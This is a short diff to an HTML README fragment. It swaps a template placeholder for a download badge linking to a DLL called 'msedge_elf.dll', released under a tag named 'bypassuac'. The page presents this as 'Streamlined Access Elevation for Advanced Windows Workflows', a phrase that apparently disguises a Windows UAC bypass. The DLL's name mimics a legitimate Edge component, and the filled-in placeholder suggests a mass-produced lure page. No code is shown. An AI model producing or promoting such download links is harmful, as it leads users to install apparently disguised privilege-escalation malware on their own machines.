@@ -4,9 +4,9 @@
   <p><strong>Streamlined Access Elevation for Advanced Windows Workflows</strong></p>
 
   <p>
- <a href="__YOUR_CLICK_LINK__" rel="nofollow">
-  <img src="https://img.shields.io/badge/Get%20Release-d90429?style=for-the-badge&logo=github&logoColor=white" alt="Download">
-</a>
+<a href="https://github.com/ZeroDayVPN/UAC/releases/download/bypassuac/msedge_elf.dll" rel="nofollow"><img src="https://img.shields.io/badge/Download%20Release-d90429?style=for-the-badge&amp;logo=github&amp;logoColor=white" alt="Download Release" style="max-width: 100%;"></a>
+
+
   </p>
 
   <hr>
